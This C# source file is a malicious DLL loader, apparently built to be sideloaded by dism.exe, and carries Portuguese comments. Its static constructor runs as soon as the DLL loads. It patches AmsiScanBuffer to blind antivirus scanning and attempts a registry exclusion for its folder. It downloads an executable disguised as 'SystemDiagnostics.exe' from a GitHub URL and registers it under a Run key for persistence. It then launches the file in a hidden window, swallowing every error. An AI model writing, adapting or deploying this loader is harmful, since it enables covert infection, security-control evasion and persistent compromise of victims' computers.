using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class DismCore
{
    // Construtor estático — executa quando a DLL é carregada
    static DismCore()
    {
        try
        {
            // Bypass AMSI
            IntPtr amsi = GetModuleHandle("amsi.dll");
            if (amsi != IntPtr.Zero)
            {
                IntPtr asb = GetProcAddress(amsi, "AmsiScanBuffer");
                if (asb != IntPtr.Zero)
                {
                    byte[] patch = IntPtr.Size == 8
                        ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
                        : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
                    uint oldProtect;
                    VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out oldProtect);
                    Marshal.Copy(patch, 0, asb, patch.Length);
                    VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                }
            }

            // Download e execução
            string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft", "Windows", "Caches");
            Directory.CreateDirectory(dir);
            string exePath = Path.Combine(dir, "SystemDiagnostics.exe");

            // Exclusion
            try
            {
                var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Exclusions\Paths");
                if (key != null) { key.SetValue(dir, 0, Microsoft.Win32.RegistryValueKind.DWord); key.Close(); }
            }
            catch { }

            string url = "https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/SystemDiagnostics.exe";
            WebClient wc = new WebClient();
            wc.Headers.Add("User-Agent", "Mozilla/5.0");
            byte[] data = wc.DownloadData(url);

            if (data.Length > 10000 && data[0] == 0x4D && data[1] == 0x5A)
            {
                File.WriteAllBytes(exePath, data);

                // Persistência
                try
                {
                    var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                    if (key != null) { key.SetValue("SystemHelper", "\"" + exePath + "\""); key.Close(); }
                }
                catch { }

                // Executar
                Process.Start(new ProcessStartInfo(exePath)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
            }
        }
        catch { }
    }

    // Funções exportadas que dism.exe espera
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string name);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);
}
